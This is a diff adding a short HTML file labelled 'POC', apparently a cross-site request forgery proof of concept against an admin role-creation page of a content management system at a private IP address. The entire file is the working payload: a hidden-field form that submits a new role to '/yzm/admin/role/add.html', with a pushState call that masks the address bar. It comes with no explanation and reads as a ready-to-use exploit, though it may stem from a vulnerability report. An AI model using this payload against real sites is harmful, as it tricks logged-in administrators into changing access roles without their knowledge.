@@ -1,0 +1,13 @@
+POC
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.138.142/yzm/admin/role/add.html" method="POST">
+      <input type="hidden" name="rolename" value="ddd" />
+      <input type="hidden" name="disabled" value="0" />
+      <input type="hidden" name="description" value="aa" />
+      <input type="hidden" name="dosubmit" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
